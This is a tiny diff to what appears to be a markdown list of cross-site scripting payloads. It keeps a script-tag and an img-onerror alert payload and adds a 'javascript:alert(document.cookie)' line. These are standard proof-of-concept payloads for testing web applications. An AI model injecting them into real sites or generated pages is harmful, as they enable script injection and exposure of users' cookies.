@@ -35,4 +35,6 @@ Payload:
 ```js
 <script>alert(window.origin)</script>
 <img src="" onerror=alert(window.origin)>
+javascript:alert(document.cookie)
+
 ```
